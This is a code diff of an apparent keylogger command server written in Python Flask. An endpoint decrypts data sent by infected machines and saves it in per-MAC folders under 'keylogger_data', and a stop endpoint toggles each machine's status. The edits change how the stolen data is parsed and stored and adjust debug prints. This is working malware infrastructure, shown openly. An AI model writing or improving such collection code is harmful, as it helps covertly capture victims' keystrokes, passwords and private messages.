@@ -104,13 +104,13 @@ def add_data():
     data = dict_data['data']
     mac = dict_data['mac']
     key=Decrypt.get_key(mac)
-    decrypted_data = Decrypt.decrypt_data(data,key)
+    decrypted_data = dict(ast.literal_eval(Decrypt.decrypt_data(data,key)))
     try:
         os.mkdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
     except FileExistsError:
         try:
-            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'a') as f:
-                f.write(decrypted_data)
+            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'a', encoding='utf-8') as f:
+                json.dump(decrypted_data, f, ensure_ascii=False)
                 return jsonify({'post':'successful'}), 200
         except Exception as e:
             print(e)
@@ -155,13 +155,12 @@ def check_status():
 def stop():
     try:
         mac = request.args.get('mac')
-        print(mac)
         with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
             dic_status = json.loads(f.read())
             dic_status[mac] = False
             with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
                 json.dump(dic_status, file)
-                print('success')
+                print('success stop')
                 return jsonify({'status':'success'}) , 200
     except:
         return jsonify({'status':'mac not available'}) , 400
